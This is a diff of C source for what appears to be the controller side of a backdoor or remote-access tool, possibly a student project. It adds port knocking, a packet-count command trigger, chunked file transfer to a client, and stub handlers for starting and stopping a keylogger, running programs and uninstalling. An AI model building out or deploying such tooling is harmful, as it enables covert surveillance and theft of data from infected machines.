@@ -1,10 +1,15 @@
-#include "utils/utils.h"
+#include "utils.h"
 #include "protocol.h"
-
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include "networking.h"
+
+
+void initiate_port_knocking(const struct server_options * server_options) {
+    send_message(server_options->client_fd, server_options->client_ip_address, PORT_KNOCKING_PORT, NULL);
+}
 
 int calculate_data_packet_count(const struct session_info * session_info) {
     return session_info->packet_counter - COMMAND_TRIGGER_THRESHOLD;
@@ -116,7 +121,7 @@ void stop_keylogger(struct session_info * session_info) {
 }
 
 // NOLINTNEXTLINE
-void receive_file(struct session_info * session_info) {
+void process_receive_file(struct session_info * session_info) {
     print_linked_list(session_info->head);
 
     const int data_packet_to_read = calculate_data_packet_count(session_info);
@@ -197,3 +202,130 @@ void receive_file(struct session_info * session_info) {
     fclose(file);
     log_message("File saved: %s", filename);
 }
+
+
+
+/**
+ *
+ *  CENTRAL MENU COMMAND HANDLERS
+ *
+**/
+
+void send_start_keylogger(int fd) {
+
+}
+
+
+void send_stop_keylogger(int fd) {
+
+}
+
+// Disconnect
+void send_disconnect(int fd) {
+
+}
+
+
+void send_file(struct server_options * server_options) {
+
+}
+
+void send_watch(int fd, enum FILE_TYPE file_type, char * path) {
+
+}
+
+
+// Run program
+void send_run_program(int fd) {
+
+}
+
+
+// Uninstall
+void send_uninstall(int fd) {
+
+}
+
+void receive_file(const struct server_options * server_options) {
+    const size_t message_length = 1024;
+    char * message = malloc(message_length);
+    long bytes_read = 0;
+
+    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    if (flags == -1) {
+        fprintf(stderr, "F_GETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+        free(message);
+        return;
+    }
+
+    // Consume any leftover characters
+    char discard;
+    while (read(STDIN_FILENO, &discard, 1) > 0) {
+        if (discard == '\n') break;
+    }
+
+    fprintf(stdout, "Enter the filename to send (i.e. /home/text.txt): ");
+    fflush(stdout);
+
+    bytes_read = read(STDIN_FILENO, message, message_length);
+    if (bytes_read > 0) {
+        message[bytes_read - 1] = '\0';
+        printf("Reading file: %s\n", message);
+        fflush(stdout);
+
+        FILE * file = fopen(message, "rb");
+        if (file == NULL) {
+            fprintf(stderr, "Failed to open file: %s\n", message);
+            free(message);
+            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+            return;
+        }
+
+        char * file_buffer = malloc(message_length);
+        if (file_buffer == NULL) {
+            fprintf(stderr, "Failed to allocate file buffer\n");
+            fclose(file);
+            free(message);
+            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
+            return;
+        }
+
+        // Send over the filename and the FILENAME command
+        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
+
+        sleep(2);
+        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
+
+        size_t chunk_count = 0;
+        size_t chunk_bytes;
+        while ((chunk_bytes = fread(file_buffer, 1, message_length - 1, file)) > 0) {
+            file_buffer[chunk_bytes] = '\0';
+            send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, file_buffer);
+            chunk_count++;
+            printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
+            fflush(stdout);
+        }
+
+        printf("File transfer complete. Sent %zu chunks\n", chunk_count);
+        fflush(stdout);
+
+        fclose(file);
+        free(file_buffer);
+    }
+
+    free(message);
+
+    sleep(2);
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RECEIVE_FILE);
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+    }
+}
+
